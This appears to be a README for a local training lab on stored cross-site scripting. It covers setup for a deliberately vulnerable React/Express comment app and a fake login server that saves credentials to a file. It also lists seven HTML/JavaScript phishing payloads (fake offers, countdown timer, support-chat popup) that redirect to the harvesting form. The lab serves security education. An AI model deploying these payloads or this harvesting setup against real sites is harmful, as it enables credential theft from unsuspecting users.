
# 💥 Stored XSS Attack Simulation — Breach Blocker Space

This project demonstrates a **Stored Cross-Site Scripting (XSS)** attack using a vulnerable comment system. It shows how attackers can inject fake components like login forms, offer buttons, and banners to steal user credentials, simulating a real-world phishing attack in a safe, local environment.

---

## 📌 Objective

- Simulate a **Stored XSS attack** using various attractive phishing payloads.
- Show the dangers of **unsanitized user input** in web applications.
- Educate users on **social engineering tactics** and their real impact.
- Demonstrate the need for **input validation, output encoding**, and **CSPs**.

---

## 🛠️ MySQL Database Setup

Before running the app, follow these steps to create the database, tables, and assign a dedicated user.

### 🔹 Step 1: Create the database and tables

```sql
CREATE DATABASE stored_xss;
USE stored_xss;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL
);

CREATE TABLE comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100),
    comment TEXT
);
````

### 🔹 Step 2: Create a new MySQL user

```sql
CREATE USER 'XSSDEMO'@'localhost' IDENTIFIED BY 'XSSAttack';
```

### 🔹 Step 3: Grant privileges

```sql
GRANT ALL PRIVILEGES ON stored_xss.* TO 'XSSDEMO'@'localhost';
FLUSH PRIVILEGES;
```

### 🔹 Step 4: Confirm the user is linked to the database

```sql
SELECT USER, HOST FROM mysql.db WHERE db = 'stored_xss';
```

### ✅ After completing the above setup:

Now you can start the backend server using the new user credentials:

```js
// db connection example in server.js
const db = mysql.createConnection({
  host: "localhost",
  user: "XSSDEMO",
  password: "XSSAttack",
  database: "stored_xss"
});
```

---

## 🔑 Signup & Login to the Portal

Once your backend and frontend are running (see below), go to the portal in your browser and:

1. **Signup** with any test username and password.
2. **Login** using those credentials.
3. You will now see a **comment input field** — use this to inject the XSS payloads.

---

## 🚀 Project Structure

### 🔹 1. Vulnerable Platform (stored-xss)

| Component    | Tech Stack                            |
| ------------ | ------------------------------------- |
| **Frontend** | React app with vulnerable comment box |
| **Backend**  | Node.js + Express + MySQL             |

### 🔹 2. Fake Login Server (fake-form)

| Component    | Tech Stack                          |
| ------------ | ----------------------------------- |
| **Frontend** | Static HTML login page              |
| **Backend**  | Node.js (saves credentials to file) |

---

## 🛠️ How to Run the Project

### ✅ Step 1: Start the Vulnerable React App
(www.github.com/Bh-Abhiram/stored-xss)

# React Frontend
cd stored-xss
npm install
npm start

# Backend
cd backend
node server.js
```

---

### ✅ Step 2: Start the Fake Form Server
(www.github.com/Bh-Abhiram/fake-form)

# Backend for fake server
cd fake-form
node server.js

# Serve the fake login page
npx serve .  # (inside /fake-form directory)
```

> ⚠️ Ensure you're in the directory where `fake-form.html` exists before running `npx serve .`.


## 🎯 XSS Payloads (Phishing Components)

Below are all the payloads used to inject via the comment box in the vulnerable React app.


### 1. 🧪 Simple Redirect Button

<button onclick="window.location.href='http://localhost:5001/fake-form.html'">Click Me</button>



### 2. 🎉 Diwali + Christmas Offer Button

<button onclick="window.location.href='http://localhost:5001/fake-form.html'" style="padding: 10px 20px; background-color: #ff9800; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer;">
  🎉 Click here to get exclusive Diwali + Christmas Offer! 🎁 Apply coupon automatically 🎯
</button>


### 3. 🎁 Scratch Card Surprise

<div style="padding: 15px; border: 2px dashed #f39c12; background-color: #fff3cd; border-radius: 10px; text-align: center;">
  <h3 style="color: #e67e22;">🎉 Scratch & Win Festive Offer!</h3>
  <p>Click below to reveal your surprise Diwali + Christmas discount! 🎁</p>
  <button onclick="window.location.href='http://localhost:5001/fake-form.html'" style="margin-top: 10px; padding: 10px 20px; background-color: #d35400; color: white; border: none; border-radius: 5px;">Reveal Offer</button>
</div>


### 4. 🎡 Spinning Wheel Offer


<div style="text-align: center; background: #e1f5fe; padding: 20px; border-radius: 10px;">
  <h3 style="color: #0277bd;">🎡 Spin the Wheel – Festive Bonanza</h3>
  <p>1 spin = 1 chance to win exclusive offers 🎁</p>
  <img src="https://i.ibb.co/ZxLkrjB/spin-wheel.gif" alt="Spin Wheel" width="150" />
  <br />
  <button onclick="window.location.href='http://localhost:5001/fake-form.html'" style="margin-top: 10px; padding: 10px 20px; background-color: #0288d1; color: white; border: none; border-radius: 6px;">Try Your Luck</button>
</div>


### 5. ⏳ Countdown Banner

<div style="background-color: #fff8e1; padding: 20px; text-align: center; border-radius: 10px; border: 1px solid #fdd835;">
  <h2 style="color: #fbc02d;">⏳ Diwali + Christmas Mega Sale Ends Soon!</h2>
  <p>Only <span id="timer" style="color: red; font-weight: bold;">10:00</span> left to claim your festive offer!</p>
  <button onclick="window.location.href='http://localhost:5001/fake-form.html'" style="padding: 10px 18px; background-color: #ff6f00; color: white; border: none; border-radius: 5px;">Claim Now</button>
</div>
<script>
  let t = 600;
  const timer = setInterval(() => {
    const min = String(Math.floor(t / 60)).padStart(2, '0');
    const sec = String(t % 60).padStart(2, '0');
    document.getElementById("timer").innerText = `${min}:${sec}`;
    if (--t < 0) clearInterval(timer);
  }, 1000);
</script>


---

### 6. 💬 Chat Popup Phishing

<div style="position: fixed; bottom: 20px; right: 20px; width: 280px; background-color: #ffffff; border: 1px solid #ccc; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); z-index: 9999;">
  <div style="background-color: #3f51b5; color: white; padding: 10px; border-top-left-radius: 10px; border-top-right-radius: 10px;">
    🎁 Support Chat
  </div>
  <div style="padding: 10px;">
    <p><strong>Agent:</strong> Hi! You’ve won a 30% festive discount!</p>
    <p><strong>You:</strong> Wow! How do I claim?</p>
    <button onclick="window.location.href='http://localhost:5001/fake-form.html'" style="padding: 8px 16px; background-color: #3f51b5; color: white; border: none; border-radius: 5px;">Claim Coupon</button>
  </div>
</div>


### 7. ✅ Fake Notification Banner

<div style="background-color: #c8e6c9; color: #2e7d32; padding: 15px; border: 2px solid #81c784; border-radius: 8px; font-weight: bold; text-align: center;">
  🎯 Congratulations! You’re eligible for an exclusive Diwali + Christmas Gift Pack! <br />
  <button onclick="window.location.href='http://localhost:5001/fake-form.html'" style="margin-top: 10px; padding: 10px 25px; background: #43a047; color: white; border: none; border-radius: 6px;">Accept Gift</button>
</div>

